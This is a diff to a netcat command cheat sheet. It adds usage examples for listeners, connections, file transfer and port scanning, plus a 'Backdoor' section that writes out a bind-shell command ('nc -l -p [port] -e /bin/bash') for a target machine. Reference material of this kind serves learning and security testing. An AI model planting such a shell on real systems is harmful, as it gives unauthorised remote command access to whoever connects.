@@ -55,7 +55,7 @@ nc [{options} [arguments]...] [target-ip] [port-number]
 ```
 
 ### Parameters
-+ -e [shell] : Executes the specified shell when connected
++ -e [cmd] : Executes a command when connection is established; typicall is a shell (i.e. /bin/bash) for backdoor connections
 + -h : Display this help menu
 + -l : Start listener/server mode to connect from a remote system
 + -n : Do not do any DNS or service lookups on any specific addresses, hostnames or ports
@@ -69,6 +69,16 @@ nc [{options} [arguments]...] [target-ip] [port-number]
 	```console
 	nc 10.0.2.5 21
 	```
+    
+- Listening for inbound connections on some port (Run a simple server)
+    ```console
+    nc -l -p [port-number]
+    ```
+- Connect to a target machine on port 80
+    ```console
+    nc [target-machine-ip] 80
+    ```
+    
 - Connect a remote target/victim system (Bind Shell)
 	- On the target/victim system
 		```console
@@ -90,19 +100,30 @@ nc [{options} [arguments]...] [target-ip] [port-number]
 		```
 
 - To transfer a file 
-	- To send a file in the source machine
-		```console
-		nc [destination-IP-address] [listening-port-number] < [file-name]
-		```
-	- To receive file in the destination machine
-		```console
-		nc -l -v [port-to-listen] > [file-to-receive][file-to-receive]
-		```
-
+    - Client (Listening) to download/receive the file
+        ```console
+        nc -l -p [port-to-listen] > [file-to-receive]
+        ```
+    - Server (Sending) to upload the file
+        ```console
+        nc -w [seconds-to-timeout] [server IP] [port-number] < [file-name]
+        ```
+        
 - TCP Port Scanner
 	```console
 	nc -v -n -z -wl [domain-name or IP address] [start_port_number-end_port_number]
 	```
+
+- Backdoor
+    - Put/Generate a backdoor on target machine that executes the bash shell on connection (bind shell)
+        + Target listens at the specified port number
+        ```console
+        nc -l -p [port-number] -e /bin/bash
+        ```
+    - Connect to the target machine
+        ```console
+        nc [target-machine-IP] [port-number]
+        ```
 
 ## Resources
 
